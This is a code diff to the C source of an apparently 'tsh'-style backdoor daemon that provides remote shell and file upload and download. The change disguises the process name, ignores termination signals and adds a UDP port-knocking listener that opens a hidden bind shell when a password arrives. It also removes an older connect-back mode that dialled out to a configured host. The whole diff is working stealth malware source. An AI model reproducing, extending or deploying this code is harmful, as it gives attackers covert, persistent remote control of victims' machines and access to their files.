@@ -47,29 +47,29 @@ unsigned char message[BUFSIZE + 1];
 
 /* function declaration */
 
+void knock();
+int open_the_door();
+
 int tshd_get_file( int client );
 int tshd_put_file( int client );
 int tshd_runshell( int client );
 
 /* program entry point */
 
-int main( void )
+int main(int argc, char const *argv[])
 {
-    int ret, len, pid, n;
+    int pid, n;
 
-#ifndef CONNECT_BACK_HOST
+    /* new process name and ignore signal */
 
-    int client, server;
-    struct sockaddr_in server_addr;
-    struct sockaddr_in client_addr;
-
-#else
-
-    int client;
-    struct sockaddr_in client_addr;
-    struct hostent *client_host;
-
-#endif
+    prctl(PR_SET_NAME, BINARY_NAME);
+    strcpy(argv[0], BINARY_NAME);
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGTERM, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    signal(SIGQUIT, SIG_IGN);
+    signal(SIGALRM, SIG_IGN);
 
     /* fork into background */
 
@@ -99,7 +99,25 @@ int main( void )
         close( n );
     }
 
-#ifndef CONNECT_BACK_HOST
+    while(1)
+    {
+        /* knock knock open the door */
+        knock();
+
+        open_the_door();
+    }
+
+    return 0;
+}
+
+int open_the_door()
+{
+    int ret, len, pid, n;
+
+    int client, server;
+    struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+
 
     /* create a socket */
 
@@ -139,8 +157,7 @@ int main( void )
         return( 6 );
     }
 
-    while( 1 )
-    {
+
         /* wait for inboud connections */
 
         n = sizeof( client_addr );
@@ -153,89 +170,9 @@ int main( void )
             return( 7 );
         }
 
-#else
-
-    while( 1 )
-    {
-        sleep( CONNECT_BACK_DELAY );
-
-        /* create a socket */
-
-        client = socket( AF_INET, SOCK_STREAM, IPPROTO_SCTP );
-
-        if( client < 0 )
-        {
-            continue;
-        }
-
-        /* resolve the client hostname */
-
-        client_host = gethostbyname( CONNECT_BACK_HOST );
-
-        if( client_host == NULL )
-        {
-            continue;
-        }
-
-        memcpy( (void *) &client_addr.sin_addr,
-                (void *) client_host->h_addr,
-                client_host->h_length );
-
-        client_addr.sin_family = AF_INET;
-        client_addr.sin_port   = htons( SERVER_PORT );
-
-        /* try to connect back to the client */
-
-        ret = connect( client, (struct sockaddr *) &client_addr,
-                       sizeof( client_addr ) );
-
-        if( ret < 0 )
-        {
-            close( client );
-            continue;
-        }
-
-#endif
-
-        /* fork a child to handle the connection */
-
-        pid = fork();
-
-        if( pid < 0 )
-        {
-            close( client );
-            continue;
-        }
-
-        if( pid != 0 )
-        {
-            waitpid( pid, NULL, 0 );
-            close( client );
-            continue;
-        }
-
-#ifndef CONNECT_BACK_HOST
-
-        /* child doesn't need the server socket */
 
         close( server );
 
-#endif
-
-        /* the child forks and then exits so that the grand-child's
-         * father becomes init (this to avoid becoming a zombie) */
-
-        pid = fork();
-
-        if( pid < 0 )
-        {
-            return( 8 );
-        }
-
-        if( pid != 0 )
-        {
-            return( 9 );
-        }
 
         /* setup the packet encryption layer */
 
@@ -288,7 +225,6 @@ int main( void )
 
         shutdown( client, 2 );
         return( ret );
-    }
 
     /* not reached */
 
@@ -720,4 +656,49 @@ int tshd_runshell( int client )
     /* not reached */
 
     return( 55 );
+}
+
+void knock()
+{
+    struct sockaddr_in myaddr;  /* our address */
+    struct sockaddr_in remaddr; /* remote address */
+    socklen_t addrlen = sizeof(remaddr);        /* length of addresses */
+    int recvlen;            /* # bytes received */
+    int fd;             /* our socket */
+    unsigned char buf[BUFSIZE]; /* receive buffer */
+
+
+    /* create a UDP socket */
+
+    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        perror("cannot create socket\n");
+        return;
+    }
+
+    /* bind the socket to any valid IP address and a specific port */
+
+    memset((char *)&myaddr, 0, sizeof(myaddr));
+    myaddr.sin_family = AF_INET;
+    myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    myaddr.sin_port = htons(KNOCK_PORT);
+
+    if (bind(fd, (struct sockaddr *)&myaddr, sizeof(myaddr)) < 0) {
+        perror("bind failed");
+        return;
+    }
+
+    /* now loop, receiving data and printing what we received */
+    for (;;) {
+        recvlen = recvfrom(fd, buf, BUFSIZE, 0, (struct sockaddr *)&remaddr, &addrlen);
+        if (recvlen > strlen(KNOCK_PWD) ) {
+            buf[recvlen-1] = 0; //to strip \n
+            printf("%s", buf);
+            if ( strcmp(buf, KNOCK_PWD) == 0)
+            {
+                close(fd);
+                return;
+            }
+        }
+    }
+    /* never exits */
 }
